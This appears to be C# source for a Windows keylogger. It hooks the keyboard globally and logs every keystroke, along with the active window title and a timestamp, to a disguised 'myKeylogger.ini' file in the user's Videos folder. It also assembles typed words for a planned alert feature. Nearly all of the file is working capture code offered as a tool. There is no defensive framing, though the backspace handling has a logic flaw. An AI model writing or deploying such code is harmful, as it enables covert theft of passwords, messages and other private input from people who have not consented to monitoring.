using MyKeylogger.Lib;
using MyKeylogger.Lib.WinApi;
using System;
using System.IO;
using System.Windows.Forms;
using tt;

namespace keylog
{
    public partial class Form1 : Form
    {
        //bat key
        private readonly KeyboardHookListener keyListener;
        private IntPtr lastActiveWindow = IntPtr.Zero;
        private bool hasSubmitted;
        private readonly KeyMapper keyMapper = new KeyMapper();
        private readonly string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini";
        //
        private string word = "";
        public  Form1()
        {
            InitializeComponent();
            Functions.CreateFile();
            keyListener = new KeyboardHookListener(new GlobalHooker());
            keyListener.KeyDown += KeyListener_KeyDown;

        }

        private void KeyListener_KeyDown(object sender, KeyEventArgs e)
        {
            if(lastActiveWindow != Functions.GetForegroundWindow())
            {
                var format = @"[""{0}"" {1}]" + Environment.NewLine + Environment.NewLine;
                var text = string.Format(format, Functions.GetActiveWindowText(), DateTime.Now);
                if(hasSubmitted)
                {
                    text = text.Insert(0, Environment.NewLine + Environment.NewLine);
                }
                File.AppendAllText(filePath, text);
                hasSubmitted = true;
                lastActiveWindow = Functions.GetForegroundWindow();
            }
            var keyText = keyMapper.GetKeyText(e.KeyCode);
            File.AppendAllText(filePath, keyText);

            if ( (keyText != " ") && (keyText != string.Empty) && (keyText.Trim() != "{ENTER}" ))
            {
                word += keyText;
                Console.WriteLine("keyTex : ----" + keyText.Trim() + "------");
                Console.WriteLine("Word   : ----" + word.Trim() + "------");
            }
            else if (keyText.Trim() == "{Backspace}")
            {
                word = TrimLastCharacter(word);
            }
            else
            {
                Console.WriteLine("alert word : "+ word);
                // alert code will be here
                // 
                word = ""; // reset word
            }
        }
        // remove last charater of string
        private string TrimLastCharacter(String str)
        {
            if (String.IsNullOrEmpty(str))
            {
                return str;
            }
            else
            {
                return str.TrimEnd(str[str.Length - 1]);
            }
        }
        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            keyListener.Enabled = true;
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            keyListener.Enabled = false;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //Functions.StartTimmer(10, 1);
        }
    }
}
